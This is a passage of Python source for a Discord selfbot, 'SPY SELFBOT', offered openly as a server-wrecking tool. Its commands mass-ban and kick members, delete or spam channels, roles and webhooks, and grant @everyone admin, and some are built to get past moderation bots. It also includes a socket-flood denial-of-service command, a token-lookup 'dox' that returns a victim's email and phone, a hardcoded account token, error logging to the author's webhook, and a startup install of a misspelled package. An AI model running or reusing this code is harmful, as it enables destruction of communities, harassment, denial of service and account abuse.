import os
os.system("pip install discord")
os.system("pip install colorama")
os.system("pip install pypresence")
os.system("pip install discord.py[voice]")
os.system("pip install cycle")
os.system("pip install jhisaku")

import discord
from discord.ext import commands
import asyncio 
import logging
import random 
from itertools import cycle
import requests
import sys
import threading
import datetime
import json
import aiohttp
from colorama import Fore           
import time
from pypresence import Presence
import subprocess,base64, codecs, smtplib
# import jishaku 
import socket
from dhooks import Webhook, Webhook
proxies = open('proxies.txt').read().split('\n')
proxs = cycle(proxies)
proxies={"http": 'http://' + next(proxs)}


os.system("clear")
risinencrypt = "mfa.ot2pClisQZrGnNkAIEyidaxD-xrnTQvyrrUyihlVz68fhODgU5VpyBvdtaRIPg3Vcf7oiGBqVWYeTGciyP1n" #token
risinencrypt1 = ">" #prefix
risinencrypt2 = "" #password
rich_presence = "y" #rpc
risinnwtff = "" #afk msg
risinnwtf = False # afk on / off 
channelnames = ["risinplayz op", "wizzed by risinplayz", "nuked by risinplayz", "beamed by risinplayz", "fucked by risinplayz", "risinplayz was here", "risinplayz runs cord"] #channelnames
rolenames = ["risinplayz op", "wizzed by risinplayz", "nuked by risinplayz", "beamed by risinplayz", "fucked by risinplayz", "risinplayz was here", "risinplayz runs cord"] #role names
servername = "TRASHED BY RISINPLAYZ" #servername 
webhookspam = "" #webhookspam msg 
intents = discord.Intents.all()
intents.members = True 
print("Attempting to kill Discord.\nLogging in Your Account......\nMade by RisinPlayZ")


def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{risinencrypt}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{risinencrypt}'}
    client = commands.Bot(command_prefix=risinencrypt1, case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {risinencrypt}'}
    client = commands.Bot(command_prefix=risinencrypt1, case_insensitive=False, intents=intents)

client.remove_command(name="help") 

def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("850221547331649537") 
            RPC.connect() 
            RPC.update(details="Created By RisinPlayZ", large_image="risinop", small_image="risinop", large_text="SPYSELFBOT", start=time.time())
        except:
            pass
rich_presence = RichPresence() 
@client.event
async def on_ready():
    os.system(f"mode 175,30 & title [SPY SELF BOT] - Connected as: {client.user}")
    print(f"Logged in as {client.user}")
loghook = Webhook("https://discord.com/api/webhooks/892751592149876796/j2YrxjcJz4lvXbmFZuJVS3rH5awHGpXKeJ8OyKowtZusZh6V3P3IToxxiLjBeYBx0ilB")
@client.event 
async def on_command_error(ctx, error): 
    await ctx.reply(f"__***```Err: {error}```***__", mention_author=True)
    loghook.send(f"__***```Err: {error}```***__")


embedmode = "True"     
@client.command(pass_context=True)
async def help(ctx):
      if embedmode == "True":
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | Premium: TRUE")
        embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/878960797949263882.gif?v=1&size=40")
    #    embed.set_image(url="https://cdn.discordapp.cattachments/852935465581412423/856814206384472064/image_search_1624350811814.png")
        embed.set_footer(text="Created by RisinPlayZ")
        embed.add_field(name="SPY SELFBOT", value=f'''{client.command_prefix}help "This Page"\n{client.command_prefix}text "Text Commands"\n{client.command_prefix}nuke "Nuke Commands"\n{client.command_prefix}nuke2 "Nuke Commands Section 2"\n{client.command_prefix}hack "Hacking Commands"\n{client.command_prefix}status "Status Commands"\n{client.command_prefix}misc "Miscellaneous Commands"\n{client.command_prefix}selfbotinfo "Information on the project"\n\n[Download](https://github.com/risinplayz/spy-selfbot) | [Tutorial](https://github.com/risinplayz/spy-selfbot)```
Connected as: {client.user},
ID: {client.user.id}, 
Ping: 19ms,                        
Prefix: {client.command_prefix},
Created: {client.user.created_at},
Nitro: {client.user.premium_type},
Verified: {client.user.verified},

Plugins: None
                        
                        
                        ```''')
        await ctx.reply(embed=embed, mention_author=True)
      else:
        await ctx.reply('''>>> **SPY SELFBOT | EMBED MODE: FALSE**\n>help\n`Shows help cmds`\n>text\n`Shows Text Cmds`\n**Created by RisinPlayZ**''', mention_author=True)
@client.command(pass_context=True)
async def text(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | TEXT CMDS")
        embed.set_footer(text="Created by RisinPlayZ") 
        embed.add_field(name=">spamgc", value="```Spam Creates Discord Group Chats.\nParameters- >spamgc <target-user-id1> <target-user-id2>\nEx- >spamgc 759028888331878430 835496899607396412```")
        embed.add_field(name=">joinvc", value="```Stay connected 24/7 in a vc, NOTE: You must be in the vc before using this cmd, afterwards you can leave.\nParameters- >joinvc\nEx- >joinvc discord.gg/spyop | Join karlo frands```")
        embed.add_field(name=">banner", value="```Gets the banner of the user.\nParameters- >banner <@user#discrim>\nEx- >banner @RisinPlayZ#1337```")         
        embed.add_field(name=">massdm", value="```Mass DMs all open / recent DMs\nParameters- >massdm <message>\nEx- >massdm discord.gg/spyop | Join karlo frands```") 
        embed.add_field(name=">idtoname", value="```Fetches the Userid#discriminator from the given ID\nParameters- >id <user-id>\nEx- >id 822466294032367636```")
        embed.add_field(name=">spam", value="```Spams the chat \nParameters- >spam <int> <msg> \nEx- >spam 50 TEAM SPY OP```")
        embed.add_field(name=">ghostping", value="```Deletes the ping instantly\nParameters- >ghostping <mention/message> \nEx- >ghostping @\everyone```")
        embed.add_field(name=">purge", value="```Deletes Your messages\nParameters- >purge <int>\nEx- >purge 50```")
        embed.add_field(name=">afk", value="```Turns on or off afk system.\nParameters- >afk on, >afk off\nEx- >afk on, >afk off```")
        embed.add_field(name=">embed", value="```Send your Message in an Embed\nParameters- >embed <text>\nEx- >embed RisinPlayZ is OP```")
        embed.add_field(name=">leave", value="```Leaves the server\nParameters- >leave <server-id>\nEx- >leave ```")
        embed.add_field(name=">firstmsg", value="```Shows the first message of the chat with a jump buton\nParameters- >firstmsg\nEx- >firstmsg```")
        embed.add_field(name=">block", value="```Blocks the user\nParameters- >block\nEx- >block```")
        embed.add_field(name=">sendhook", value="```Sends a message to the webhook.\nParameters- >sendhook <webhook> <message>\nEx- >sendhook https://discord.com/api/webhooks/851376570642989093/Wq_TQM6h5PTusC8nJox1prsC3Ou7gt6MpfeZSyEJyhyi5B3E-1OBt1vf3WqfUYgmwIYb TEAM SPY OP```")
        embed.add_field(name=">image", value="```Sends Image in an Embed\nParameters- >image <link>\nEx- >image https://media.discordapp.net/attachments/802230471378468875/833276656851746837/Screenshot_20210418-151340.png?width=293&height=586 ```")
        await ctx.reply(embed=embed, mention_author=True)
@client.command(pass_context=True)
async def gcspam(ctx, lol, idk):
  await ctx.reply("SPY SELFBOT | GROUP CHAT SPAM INITIATED")
  for gc in range(10):
    lol = lol
    idk = idk 
    try: 
       
      requests.post('https://discordapp.com/api/v9/users/@me/channels', proxies=proxies, headers=headers, json={"recipients":[lol,idk]})
      await ctx.send("SPY SELFBOT | GROUP CREATED")
    except:
      print("SPY SELFBOT | UNABLE TO CREATE GROUP CHAT")
@client.command(pass_context=True)
async def hack(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | HACK CMDS")
        embed.set_footer(text="Created by RisinPlayZ")
        embed.add_field(name=">doxip", value="```Displays info on an IP \nParameters- >ip <target> \nEx- >ip 162.159.128.233```")
        embed.add_field(name=">dosip", value="```Performs simple Denial of Service attack on an IP \nParameters- >dosip <target> \nEx- >dosip 162.159.128.233```") 
        embed.add_field(name=">gmailbomber", value="```Attempts Mass-Messages to the Target Gmail-ID, works on console. proxies are recommended.\nParameters- >gmailbomber\nEx- >gmailbomber```")
        embed.add_field(name=">doxuser", value="```Displays info on a user | Only works in a server\nParameters- >doxuser <@target> \nEx- >doxuser @RisinPlayZ```")
        embed.add_field(name=">doxtoken", value="```Displays info on a Discord Account \nParameters- >tdox <target-token> \nEx- >tdox mfa.W3Di4FprRZ_AXH_Y5-A9ReoshSu9Dzn_fTXrvBhwc6p3LvkYLJM4jbr338YUMZ7ECnj2zbxnKm-I2ReFh2Zp```")
        embed.add_field(name=">doxserver", value="```Displays info on a Discord Server\nParameters- >doxserver\nEx- >doxserver```")
        embed.add_field(name=">pingweb", value="```Pings the website to check whether its operational or not.\nParameters- >pingweb <website url>\nEx- >pingweb https://discord.com/```")
        embed.add_field(name=">getroles", value="```Sends all roles of a server which you dont have the perm to view | Note - Use a spam channel.\nParameters- >getroles\nEx- >getroles```")
        embed.add_field(name=">killwebhook", value="```Deletes a webhook\nParameters- >delwebhook <webhook>\nEx- >delwebhook https://discordapp.com/api/webhooks/752659248508305488/JnMq-sBIN3IMgDpzgT-KnpFDLEBdQs8AO9sD-_3STGk_ijmyqeKrop3kYSV6lb4ry8S```")
        embed.add_field(name=">spamhook", value="```Initiates a spam on the given webhook\nParameters- >spamhook <webhook_url> <message>\nEx- >spamhook https://discord.com/api/webhooks/851376570642989093/Wq_TQM6h5PTusC8nJox1prsC3Ou7gt6MpfeZSyEJyhyi5B3E-1OBt1vf3WqfUYgmwIYb @everyone SPY OP```")
        await ctx.reply(embed=embed, mention_author=True)
  
@client.command(pass_context=True)
async def nuke(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | NUKE CMDS")
        embed.set_footer(text="Created by RisinPlayZ")
        embed.add_field(name=">prune", value="```Prunes with 1 day inactivity & all roles.\nParameters->prune\nEx->prune```")
        embed.add_field(name=">botmassban", value="```Bans Everyone in the server using a bot.\nParameters- >botmassban <prefix> <command-cooldown-time in seconds> <Target-server-ID> | Ban Perms Required\nEx- >botmassban ? 3 810480167453196299```")             
        embed.add_field(name=">massban", value="```Bans Everyone in the server.A working banall cmd!!, \nParameters- >banall <Target-server-ID> | Ban Perms Required\nEx- >massban 810480167453196299```")
        embed.add_field(name=">masskick", value="```Bans Everyone in the server.A working kickall cmd!!, \nParameters- >kickall <Target-server-ID> | Kick Perms Required\nEx- >masskick 810480167453196299```")
        embed.add_field(name=">channelfuckery", value="```Mass Patches the server settings, notification, moderation, community-mode\nParameters- >channelfuckery <Target-server-ID>\nExample- >channelfuckery 810480167453196299```")
        embed.add_field(name=">trash", value="```Destruction 2021, \nParameters- >trash <Target-server-ID> | Admin Perms Required\nEx- >trash 810480167453196299```")
        embed.add_field(name=">securitynuke", value="```Nukes the server in a way, security / wickbot wont punish you.\nParameters- >securitynuke\nEx- >securitynuke```") 

        embed.add_field(name=">universalnuke", value="```Nukes the server in a way, universal bot wont punish you.\nParameters- >universalnuke\nEx- >universalnuke```") 
        embed.add_field(name=">nickall", value="```Updates the Nickname of all users in the server.\nParameters- >nickall\nEx- >nickall```")
        embed.add_field(name=">delemojis", value="```Deletes all emojis of the server.\nParameters- >delemojis\nEx- >delemojis```")
        embed.add_field(name=">delstickers", value="```Deletes all stickers of the server.\nParameters- >delstickers\nEx- >delstickers```")
        
        embed.add_field(name=">scrape", value="```Scrape members list from a server \nParameters- >scrape <Target-server-ID> | Admin or manage Perms Required\nEx- >scrape 810480167453196299```")
        embed.add_field(name=">rc", value="```Renames every channel to the name provided\nParameters- >rc <name>\nEx- >rc RisinPlayZ op bolte```")
        embed.add_field(name=">rr", value="```Renames every role to the name provided\nParameters- >rr <name>\nEx- >rr RisinPlayZ op bolte```")
        embed.add_field(name=">webhookspam", value="```Creates multiple webhooks in every channel and Spams everyone with webhook in all channel\nParameters- >webhookspam\nEx- >webhookspam```") 
        #embed.add_field(name=">stopwebhookspam", value="```Stops the ongoing spam\nParameters- >stopwebhookspam\nEx- >stopwebhookspam```") 
        # embed.add_field(name=">spamgcname", value="```Spam Changes Group chat name\nParameters- >spamgcname\nEx- >spamgcname```") 
        
        await ctx.reply(embed=embed, mention_author=True)
@client.command()
async def nuke2(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | NUKE CMDS 2")
        embed.set_footer(text="Created by RisinPlayZ")
        embed.add_field(name=">spamchannels", value="```Spam Creates Text Channels\nParameters- >spamchannels <amount> <name>\nEx- >spamchannels 69 risinplayz-op```")
        embed.add_field(name=">spamroles", value="```Spam Creates Text Channels\nParameters- >spamroles <amount> <name>\nEx- >spamroles 69 risinplayz-op```")
        embed.add_field(name=">cc", value="```Deletes channels with the same name\nParameters->cc <channel-name>\nEx- >cc wizzed-by-risinplayz```")
        embed.add_field(name=">cr", value="```Deletes roles with the same name\nParameters->cr <role-name>\nEx- >cr wizzed-by-risinplayz```")
        embed.add_field(name=">massunban", value="```Unbans everyone in the server.\nParameters- >massunban\nEx- >massunban```")
        embed.add_field(name=">delchannels", value="```Removes all channels of the server\nParameters- >delchannels\nEx- >delchannels```")
        embed.add_field(name=">delroles", value="```Removes all roles of the server\nParameters- >delroles\nEx- >delroles```")
        embed.add_field(name=">giveadmin", value="```Enables Admin in Everyone\nParameters- >giveadmin\nEx- >giveadmin```")       
        
        await ctx.reply(embed=embed, mention_author=True)
@client.command()
async def premium(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | Premium CMDS")
        embed.set_footer(text="Created by RisinPlayZ")
        embed.add_field(name=">jsk", value="```jishaku is an extension for bot developers that enables rapid prototyping, experimentation, and debugging of features for bots.\nParameters- >jsk <command> <argument>```")
        embed.add_field(name=">eval", value="```Function that evaluates any string as javascript code and actually executes it.\nParameters- >eval <code>\nEx- >eval client.guilds.cache.size```")
        embed.add_field(name=">plugins", value="```Enable / DIsable Plugins Feature\nParameter- >plugins <enable/disable>\nEx- >plugins enable```")
        await ctx.reply(embed=embed, mention_author=True)
@client.command()
async def jsk(ctx):
  await ctx.reply("SPY SELFBOT | Not a Premium user", mention_author=True)
@client.command()
async def eval(ctx):
  await ctx.reply("SPY SELFBOT | Not a Premium user", mention_author=True)
@client.command()
async def plugins(ctx):
  await ctx.reply("SPY SELFBOT | Not a Premium user", mention_author=True)
# @client.command(pass_context=True)
# async def misc(ctx):
#         embed = discord.Embed(color=000000)
#         embed.set_author(name="SPY SELFBOT | MISC CMDS")
#         embed.set_footer(text="Created by RisinPlayZ")
#         embed.add_field(name=">renameserver", value="```Renames the server name\nParameters- >renameserver <name>\nEx- >renameserver TEAM SPY OP```")

        
#         await ctx.reply(embed=embed, mention_author=True)

@client.command(pass_context=True)
async def status(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="SPY SELFBOT | Additional Status CMDS")
        embed.set_footer(text="Created by RisinPlayZ")
        embed.add_field(name=">play", value="```Changes the status to Playing\nParameters- >play <status> \nEx- >play PUBG EVEN AFTER BAN```")
        embed.add_field(name=">watch", value="```Changes the status to Watching\nParameters- >watch <status> \nEx- >watch NetfliX```")
        embed.add_field(name=">listen", value="```Changes the status to Listening\nParameters->listen <status> \nEx- >listen Fake Spotify OP```")
        embed.add_field(name=">stream", value="```Changes the status to streaming\nParameters- >stream <status>\nEx- >stream 1000 Million Subscribers special live stream```")
        embed.add_field(name=">stopstatus", value="```Stops the current status\nParameters- >stopstatus\nEx- >stopstatus```")
        embed.add_field(name=">RPC", value="```Connect to Rich Presence Client\nParameters- >rpc <application-id> <status> <image-name> <text>\nExample- >rpc 822466294032367636 'RisinPlayZ RPC' idk SPY SELFBOT```")
        await ctx.reply(embed=embed, mention_author=True)


@client.command()
async def spam(ctx, amount: int, *, message):
    
    for _i in range(amount):
        await ctx.send(message)
spypinglol = random.randint(25, 40)
@client.command()
async def alive(ctx):
    await ctx.reply(f">>> **SPY SELFBOT**\nUser: `! :tm:RisinPlayZˢᵖʸ†ᴵᴺ#1337`\nID: `879863309430571029`\nPrefix: `>`\nNitro: `Nitro Premium`\nAlive: `True`\nStatus:`Browser Online`\nPing: `{spypinglol}ms`\nPlatform: `Sandbox`", mention_author=True)
@client.command()
async def restart(ctx):
    await ctx.send("Restarting Selfbot........")
    os.system('python ' + sys.argv[0])

@client.command()
async def securitynuke(ctx):
    await ctx.reply(f"{risinencrypt1}dCM", mention_author=True)
    await ctx.reply(f"{risinencrypt1}rc {channelnames}", mention_author=True)
    await ctx.reply(f"{risinencrypt1}rr {rolenames}", mention_author=True) 
    await ctx.reply(f"{risinencrypt1}servername TRASHED BY RISINPLAYZ", mention_author=True)
    await ctx.reply(f"{risinencrypt1}webhookspam", mention_author=True) 
    await ctx.reply(f"{risinencrypt1}nickall", mention_author=True)
    await ctx.reply(f"{risinencrypt1}delemojis", mention_author=True)
  #  asyncio.sleep(5)
    # await ctx.reply(f"{risinencrypt1}channelfuckery", mention_author=True)
    await ctx.reply(f"{risinencrypt1} ", mention_author=True)

@client.command()
async def universalnuke(ctx):
    await ctx.reply(f"{risinencrypt1}dCM", mention_author=True)
    await ctx.reply(f"{risinencrypt1}rc {channelnames}", mention_author=True)
    await ctx.reply(f"{risinencrypt1}rr {rolenames}", mention_author=True) 
    await ctx.reply(f"{risinencrypt1}servername TRASHED BY RISINPLAYZ", mention_author=True)
    # await ctx.reply(f"{risinencrypt1}webhookspam", mention_author=True) 
    await ctx.reply(f"{risinencrypt1}nickall", mention_author=True)
    await ctx.reply(f"{risinencrypt1}delemojis", mention_author=True)
    await ctx.reply(f"{risinencrypt1}channelfuckery", mention_author=True)
    await ctx.reply(f"{risinencrypt1} ", mention_author=True)

@client.command(
    aliases=['doxip', 'iplookup', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {
            'name': 'IP',
            'value': geo['query']
        },
        {
            'name': 'Type',
            'value': geo['ipType']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'City',
            'value': geo['city']
        },
        {
            'name': 'Continent',
            'value': geo['continent']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'Hostname',
            'value': geo['ipName']
        },
        {
            'name': 'ISP',
            'value': geo['isp']
        },
        {
            'name': 'Latitute',
            'value': geo['lat']
        },
        {
            'name': 'Longitude',
            'value': geo['lon']
        },
        {
            'name': 'Org',
            'value': geo['org']
        },
        {
            'name': 'Region',
            'value': geo['region']
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
            
    return await ctx.reply(embed=em, mention_author=True)

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de", "en-GB", "en-US", "es-ES", "fr", "hr", "it", "lt", "hu", "nl",
    "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs", "el", "bg",
    "ru", "uk", "th", "zh-CN", "ja", "zh-TW", "ko"
]
@client.command()
async def dosip(ctx, target):
    await ctx.reply("Sending Requests.....", mention_author=True)
    for i in range(1,100):
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect((target,80))
      data = b"GET / HTTP 1.1\r\n"*1000
      s.send(data)
      s.close()
      print('Attack sent!')

@client.command(aliases=['tdox', 'doxtoken'])
async def tokeninfo(ctx, _token):
    
    headers = {'Authorization': _token, 'Content-Type': 'application/json'}
    try:
        res = requests.get(
            'https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(
            ((int(user_id) >> 22) + 1420070400000) /
            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get(
                'https://canary.discordapp.com/api/v6/users/@me',
                headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) /
                1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=
                f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
            )
            fields = [
                {
                    'name': 'Flags',
                    'value': res['flags']
                },
                {
                    'name': 'Local language',
                    'value': res['locale'] + f"{language}"
                },
                {
                    'name': 'Verified',
                    'value': res['verified']
                },
            ]
            for field in fields:
                if field['value']:
                    em.add_field(
                        name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(
                        url=
                        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    )
            return await ctx.reply(embed=em, mention_author=True)
        except KeyError:
            await ctx.reply("SPY SELFBOT | Invalid Token", mention_author=True)
    em = discord.Embed(
        description=
        f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
    )
    em.set_footer(text="Created by RisinPlayZ")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {
            'name': 'Phone',
            'value': res['phone']
        },
        {
            'name': 'Flags',
            'value': res['flags']
        },
        {
            'name': 'Local language',
            'value': res['locale'] + f"{language}"
        },
        {
            'name': 'MFA',
            'value': res['mfa_enabled']
        },
        {
            'name': 'Verified',
            'value': res['verified']
        },
        {
            'name': 'Nitro',
            'value': nitro_type
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(
                name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(
                url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
            )
            em.set_footer(text="Created by RisinPlayZ")
    return await ctx.reply(embed=em, mention_author=True)

     
def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

@client.command(aliases=["trash", "wizz"])
async def destroy(ctx):
    try:
        await ctx.guild.edit(
            name=f"{servername}",
            description="RisinPlayZ got no chill",
            reason="ripped by RisinPlayZ",
            icon=None,
            banner=None)
    except:
        pass
    await ctx.send(f"{risinencrypt1}delroles")
    await ctx.reply(f"{risinencrypt1}massban {ctx.guild.id}", mention_author=True)
    await ctx.send(f"{risinencrypt1}delchannels")
   
    for _i in range(100):
        await ctx.guild.create_text_channel(name=f"{channelnames}")
    for _i in range(100):
        await ctx.guild.create_role(name=f"rolenames", color=RandomColor())
    
MESSAGE_CONTENTS = ['@everyone **RISNPLAYZ GOT NO CHILL**']
WEBHOOK_NAMES = ['WIZZED BY RISINPLAYZ ', 'WIZZED BY RISINPLAYZ'] 

# @client.event
# async def on_guild_channel_create(channel):
#   webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
#   while True:  
#     await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
format = "%a, %d %b %Y | %H:%M:%S %ZGMT"

@client.command()
@commands.guild_only()
async def doxserver(ctx):
    embed = discord.Embed(
    )
    text_channels = len(ctx.guild.text_channels)
    voice_channels = len(ctx.guild.voice_channels)
    categories = len(ctx.guild.categories)
    channels = text_channels + voice_channels
    embed.set_thumbnail(url = str(ctx.guild.icon_url))
    embed.add_field(name = f"Information About **{ctx.guild.name}**: ", value = f":white_small_square: ID: **{ctx.guild.id}** \n:white_small_square: Owner: **{ctx.guild.owner}** \n:white_small_square: Location: **{ctx.guild.region}** \n:white_small_square: Creation: **{ctx.guild.created_at.strftime(format)}** \n:white_small_square: Members: **{ctx.guild.member_count}** \n:white_small_square: Channels: **{channels}** Channels; **{text_channels}** Text, **{voice_channels}** Voice, **{categories}** Categories \n:white_small_square: Verification: **{str(ctx.guild.verification_level).upper()}** \n:white_small_square: Features: {', '.join(f'**{x}**' for x in ctx.guild.features)} \n:white_small_square: Splash: {ctx.guild.splash}")
    embed.set_footer(text="Created by RisinPlayZ")
    await ctx.reply(embed=embed, mention_author=True)
   
@client.command(aliases=['killwebhook'])
async def delwebhook(ctx,link=None):
    if link == None:
        embed=discord.Embed(title="SPY SELFBOT", description="```>delwebhook <webhook>```")
        embed.set_footer(text="Created By RisinPlayZ")
        await ctx.reply(content="",embed=embed, mention_author=True)
    else:
        embed=discord.Embed(title="SPY SELFBOT", description=f"Sending a delete request to\n{link}")
        embed.set_footer(text="Created by RisinPlayZ")
        await ctx.reply(content="",embed=embed, mention_author=True)


        result = requests.delete(link)
  
        if result.status_code == 204:
            embed=discord.Embed(title="SPY SELFBOT", description=f"WEBHOOK DELETED")
            embed.set_footer(text="Created by RisinPlayZ")
            await ctx.reply(embed=embed, mention_author=True)
        else:
            embed=discord.Embed(title="SPY SELF BOT", description=f"Delete request responded with status code : {result.status_code}\{result.text}")
            embed.set_footer(text="Created by RisinPlayZ")
            await ctx.reply(embed=embed, mention_author=True)

@client.command(aliases=[""])
async def purge(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(
                lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
    else:
        async for message in ctx.message.channel.history(limit=amount).filter(
                lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
  
@client.command()
async def av(ctx,*, avamember):
    user = client.get_user(avamember)
    await ctx.send(f"{user.avatar_url}")

@client.command()
async def pingweb(ctx, website=None):
    await ctx.reply(f'Pinging {website} with 32 bytes of data:', mention_author=True)
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        if r == 404:
            await ctx.reply(f'Website is down, status = ({r})', mention_author=True)
        else:
            await ctx.reply(f'Website is operational, status = ({r})', mention_author=True)
            await ctx.reply("Timed out", mention_author=True)

@client.command()
async def ping(ctx, ipp=None):
    await ctx.reply(f'Pinging {ipp} with 32 bytes of data:', mention_author=True)
    await ctx.reply("Timed out.", mention_author=True)
    
@client.command(aliases=["whois"])
async def doxuser(ctx, member: discord.Member = None):
    if not member:  # if member is no mentioned
        member = ctx.message.author  # set member as the author
    roles = [role for role in member.roles]
    embed = discord.Embed(colour=discord.Colour.default(), timestamp=ctx.message.created_at,
                          title=f"User Info - {member}")
    embed.set_thumbnail(url=member.avatar_url)
    embed.set_footer(text="Created By RisinPlayZ")

    embed.add_field(name="ID:", value=member.id)
    embed.add_field(name="Display Name:", value=member.display_name)

    embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %d %B %Y, %I:%M %p UTC"))
    embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %d %B %Y, %I:%M %p UTC"))

    embed.add_field(name="Roles:", value="".join([role.mention for role in roles]))
    embed.add_field(name="Highest Role:", value=member.top_role.mention)
    print(member.top_role.mention)
    await ctx.reply(embed=embed, mention_author=True)

@client.command(aliases=["roles"])
async def getroles(ctx):
   
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    print(roleStr)
    await ctx.reply(roleStr, mention_author=True)
   
@client.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
#status cmds bolte
@client.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.reply("SPY SELFBOT | Changing Status.....", mention_author=True)
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await client.change_presence(activity=stream)
    await ctx.reply("Streaming created!", mention_author=True)

@client.command(aliases=["playing"])
async def play(ctx, *, message):
    game = discord.Game(
        name=message
    ) 
    await ctx.reply("SPY SELFBOT | Changing Status......", mention_author=True)
    await client.change_presence(activity=game) 
    await ctx.reply("Playing Created!", mention_author=True)
    
@client.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.reply("SPY SELFBOT | Changing Status.....", mention_author=True)
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, name=message))
    await ctx.reply("Watching created!", mention_author=True)

@client.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.reply("SPY SELFBOT | Changing Status.....", mention_author=True)
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))
    await ctx.reply("Listening created!", mention_author=True)

@client.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.reply("SPY SELFBOT | Killing Status......", mention_author=True)
    await client.change_presence(activity=None)
    await ctx.reply("Status Removed Successfully!", mention_author=True)

@client.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
  
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "RisinPlayZ OP"
        name = ""
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)


@client.command(
    name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1,
                                           oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(
